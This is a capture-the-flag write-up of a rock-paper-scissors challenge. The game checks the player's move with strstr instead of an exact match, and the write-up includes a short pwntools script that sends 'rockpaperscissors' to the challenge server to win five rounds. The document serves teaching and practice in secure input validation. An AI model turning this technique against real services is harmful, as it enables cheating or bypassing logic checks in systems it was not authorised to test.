# CyLab — RPS

* **Platform:** CyLab Security Academy / picoCTF 2022 (Challenge ID: `293`)
* **Category:** Binary Exploitation / Logic Flaw (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, Source Analysis
* **Binary:** `game-redacted` (x86_64 ELF)

---

## TL;DR

The game challenges the user to win five consecutive rounds of Rock-Paper-Scissors against the computer. Instead of performing an exact string comparison (`strcmp`) on user input, the application evaluates the win condition using `strstr(player_turn, loses[computer_turn])`. Because `strstr()` checks for substring presence anywhere within the input, sending a single composite string containing all winning moves (`"rockpaperscissors"`) guarantees that `strstr()` evaluates to true on every round, securing five consecutive wins and revealing the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file game-redacted
game-redacted: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=game-redacted
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
1. **Full Protections Enabled:** Full RELRO, Canary, NX, and PIE are all active.
2. **Logic-Driven Challenge:** Memory corruption is not required; the vulnerability stems from flawed string matching logic in the rule engine.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};

bool play() {
    char player_turn[100];
    int computer_turn = rand() % 3;

    printf("Please make your selection (rock/paper/scissors):\n");
    read(0, player_turn, 99);

    printf("You played: %s\n", player_turn);
    printf("The computer played: %s\n", hands[computer_turn]);

    // VULNERABILITY: strstr searches for substring rather than requiring exact equality
    if (strstr(player_turn, loses[computer_turn])) {
        puts("You win! Play again?");
        return true;
    } else {
        puts("Seems like you didn't win this time. Play again?");
        return false;
    }
}

int main() {
    int wins = 0;
    while (1) {
        // Menu selection: 1 to play, 2 to exit
        if (play()) {
            wins++;
        } else {
            wins = 0;
        }

        if (wins >= 5) {
            puts("Congrats, here is your flag!");
            // Display flag
            break;
        }
    }
}
```

### 2. Logic Flaw Breakdown

The code establishes:
- If computer selects `0` (`"rock"`), winning move is `loses[0]` $\rightarrow$ `"paper"`.
- If computer selects `1` (`"paper"`), winning move is `loses[1]` $\rightarrow$ `"scissors"`.
- If computer selects `2` (`"scissors"`), winning move is `loses[2]` $\rightarrow$ `"rock"`.

The condition checks:
$$\text{strstr}(\text{player\_turn}, \text{loses}[\text{computer\_turn}]) \neq \text{NULL}$$

Because `strstr` returns a pointer to the first occurrence of the substring anywhere within the haystack, we can satisfy all three possible conditions simultaneously by supplying a concatenated payload:

$$\text{Payload} = \text{"rock"} \parallel \text{"paper"} \parallel \text{"scissors"}$$

```text
                      "rockpaperscissors"
                       ^^^^
                       Matches if computer picks scissors (loses[2] = "rock")

                      "rockpaperscissors"
                           ^^^^^
                           Matches if computer picks rock (loses[0] = "paper")

                      "rockpaperscissors"
                                ^^^^^^^^
                                Matches if computer picks paper (loses[1] = "scissors")
```

No matter what random index the computer generates, the match succeeds with $100\%$ probability.

---

## Dynamic Analysis & Exploitation Strategy

1. **Protocol Automation:**
   - Loop 5 times:
     - Send menu choice `b"1\n"` to initiate a match.
     - Send payload `b"rockpaperscissors\n"` as the move.
2. **Flag Retrieval:**
   - On the fifth successful round, `wins >= 5` is reached, and the program executes the flag disclosure branch.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, time
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 33408

def solve(io):
    for i in range(5):
        io.sendline(b"1")
        # Composite input satisfies all 3 winning criteria
        io.sendline(b"rockpaperscissors")
        time.sleep(0.2)
        log.info(f"Completed round {i + 1}/5")

    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33408: Done
[*] Completed round 1/5
[*] Completed round 2/5
[*] Completed round 3/5
[*] Completed round 4/5
[*] Completed round 5/5
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33408
```

---

## Key Takeaways & Lessons

1. **Substring Matching vs. Exact Equality:** Using `strstr()` to validate discrete choices allows attackers to pack multiple mutually exclusive options into a single string. Strict equality (`strcmp`) or enum-based parsers must be used for state machine inputs.
2. **Universal Winning Inputs:** When a conditional evaluator tests against multiple string cases with loose containment checks, identifying an input that contains every acceptable token renders the RNG or state tracking irrelevant.
3. **Pwn Is More Than Memory Corruption:** Binary exploitation encompasses logical vulnerabilities, algorithmic design flaws, and validation oversights, often yielding reliable exploits independent of modern binary defenses (Full RELRO, Canary, PIE).
